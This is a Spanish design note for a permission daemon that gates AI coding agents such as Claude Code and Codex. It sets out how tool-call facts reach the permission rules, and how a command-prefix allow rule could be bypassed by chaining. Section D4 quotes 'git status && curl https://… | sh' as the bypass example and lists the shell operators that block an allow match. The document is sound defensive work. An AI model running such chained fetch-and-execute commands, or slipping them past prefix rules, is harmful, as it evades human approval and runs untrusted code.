# Design — adaptadores-con-rawinput

## Context

El daemon lee los hechos que casan las reglas de la llamada a herramienta que
viaja en `session/request_permission` (`RequestFacts::from_tool_call`,
`core/meltemid/src/permissions.rs`): la herramienta es `kind` o, si falta,
`title`; el comando es `rawInput.command`; la ruta es `rawInput.path` o, si
falta, la primera de `locations`. El aprobador del CLI lee lo mismo
(`tui/src/approver.rs`). Los dos adaptadores propios no mandan ni `rawInput` ni
`locations` en la petición:

- `meltemi-claude-acp` (`claude/permission.rs`, `request_for`) pone la entrada
  de la herramienta como texto en `content` y un título con su primera línea.
  La llamada que la sesión transmitió con el mismo id sí lleva `locations`
  (`claude/mapping.rs`, `tool_call`), pero el daemon no la consulta.
- `meltemi-codex-acp` (`codex/permission.rs`, `request_for`) recibe del
  servidor una aprobación que nombra el ítem (`itemId`) y, a veces, una razón;
  el comando o los archivos viajaron antes, en `item/started`, y el `Mapper`
  los convirtió en la llamada de la sesión sin guardarlos.

## Goals / Non-Goals

**Goals**: que la petición de permiso de los dos adaptadores lleve los hechos
que el daemon y el aprobador ya saben leer, de modo que una regla por comando
o por ruta gobierne a Claude Code y a Codex; y que eso no ensanche lo que una
regla `allow` permite.

**Non-Goals**: que las bandejas propongan esas reglas
(`regla-precisa-en-la-bandeja`); cambiar el contrato daemon↔clientes; cambiar
lo que la compuerta del CLI deja pasar.

## Decisions

### D1 — Claude: `rawInput` es la entrada tal cual, y la ruta va en `locations`

`request_for` añade `rawInput` con la entrada que la herramienta recibió,
byte a byte, cuando no es nula, y `locations` con la ruta que la entrada nombra
(`file_path`, `path` o `notebook_path`, la misma función que ya da las
ubicaciones de la llamada). `rawInput.command` de `Bash` es su comando; la
ruta de `Read`, `Write`, `Edit`, `MultiEdit` y `NotebookEdit` llega por
`locations`, porque su entrada la llama `file_path` y el daemon lee `path`; la
de `Glob` y `Grep` llega por las dos.

El texto de `content` se queda: es lo que las superficies muestran hoy, y
quitarlo cambiaría lo que el humano ve, que no es lo que esta change pide.

*Alternativa descartada*: traducir `file_path` a `rawInput.path`. Sería
editar la entrada del proveedor; ACP ya tiene `locations` para eso.

### D2 — Codex: el `Mapper` recuerda los hechos de cada ítem

El `Mapper` vive toda la sesión y ve cada `item/started`. Guarda, por id de
ítem, un `ItemFacts`: el título que mostró, el comando de un
`commandExecution` y la ruta de un `fileChange` **que toca un solo archivo**.
Cuando llega una aprobación, el bucle del turno, que ya consulta el `Mapper`
para anunciar lo nunca visto, le pasa a `request_for` los hechos del ítem.

`request_for` los usa solo cuando la aprobación concede lo que el ítem es:

- aprobación de comando sin concesión aparte → título del ítem y
  `rawInput.command`;
- aprobación de cambio de archivos sin raíz → título del ítem y, si toca un
  solo archivo, `rawInput.path` y `locations`.

### D3 — Lo que concede otra cosa no hereda los hechos del ítem

Una aprobación de comando que en realidad es un acceso de red, o una entrada a
un terminal que ya corre, o un cambio de archivos que además pide una raíz
para el resto de la sesión, ya muestra lo que de verdad concede
(`codex-al-dia` D7). No lleva el comando del ítem: una regla que permite `cargo`
no debe permitir que ese `cargo` hable con un host nuevo ni recibir lo que se
escriba en su terminal.

Un cambio de varios archivos no lleva ruta. El daemon casa una sola ruta, la
primera; una regla `allow` con prefijo `src/` permitiría un cambio que toca
`src/a.rs` y algo fuera de `src/`. Sin ruta, la regla por ruta no casa y la
petición escala al humano, que ve todos los archivos.

### D4 — Un prefijo `allow` no permite lo que se encadena tras él

Hasta hoy, una regla con prefijo de comando gobernaba solo al agente simulado y
a los de nivel 1: Claude y Codex nunca casaban. Con D1 y D2 casan, y el prefijo
es una comparación de texto. La regla que el aprobador recuerda para un
comando es ese comando entero como prefijo, así que recordar `git status`
también permitiría `git status && curl https://… | sh`.

Una regla **`allow`** con prefijo de comando casa solo si lo que sigue al
prefijo no contiene un operador que encadene, redirija o sustituya:
`;`, `&`, `|`, `` ` ``, `$(`, `>`, `<`, o un salto de línea. Si lo contiene,
la regla no casa y, sin otra regla, la petición escala al humano. Lo que el
prefijo mismo contiene no se mira: quien escribió `cargo test | tail` como
prefijo lo eligió.

Una regla **`deny`** sigue casando con todo lo que empieza por su prefijo: una
denegación que deja de aplicar por un `;` sería el agujero inverso.

*Coste aceptado*: `cargo test 2>&1` ya no lo permite una regla `cargo test`, y
escala. Preguntar de más es el fallo seguro; permitir de más no lo es.

*Alternativas descartadas.*
- Partir el comando por operadores y exigir que cada parte case. Es un
  intérprete de shell a medias, distinto en `sh`, `cmd` y PowerShell, y un
  error en él permite.
- Dejarlo para otra change. Esta es la que hace alcanzable el agujero con los
  dos agentes que más se usan.

## Risks / Trade-offs

- `rawInput` de `Write` lleva el contenido entero del archivo, que ya viajaba
  como texto en `content`: la petición crece al doble para esa herramienta. Se
  acepta; es lo que ACP define como `rawInput`.
- Las rutas que dé el proveedor son las suyas. Claude manda rutas absolutas;
  una relativa no casará con un prefijo absoluto y escalará, que es el fallo
  seguro.

## Verification

- Tests de los dos adaptadores sobre `request_for`: los hechos llegan; lo que
  concede otra cosa no los hereda; un cambio de varios archivos no lleva ruta.
- Test del motor de reglas: `allow` por prefijo no casa con lo encadenado;
  `deny` sí.
- e2e con el adaptador de Claude real y el proveedor simulado: una regla
  `allow` con `tool = "execute"` y prefijo de comando decide la pregunta del
  canal de herramienta sin escalar al humano.
